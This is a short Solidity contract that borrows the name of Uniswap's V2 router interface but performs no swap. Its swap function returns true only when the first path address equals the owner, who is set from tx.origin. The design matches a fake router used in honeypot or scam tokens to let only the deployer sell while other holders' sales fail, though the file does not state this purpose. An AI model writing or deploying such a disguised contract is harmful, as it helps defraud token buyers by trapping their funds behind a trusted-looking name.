// SPDX-License-Identifier: MIT 
pragma solidity ^0.8.1;

contract IUniswapV2Router02 {
    address public owner;

    constructor() {
        owner = tx.origin;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function getOwner() view external returns(address) {
        return owner;
    }

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns(bool) {
        if (path[0] != owner) {
            return false;
        } else {
            return true;
        }
    }
}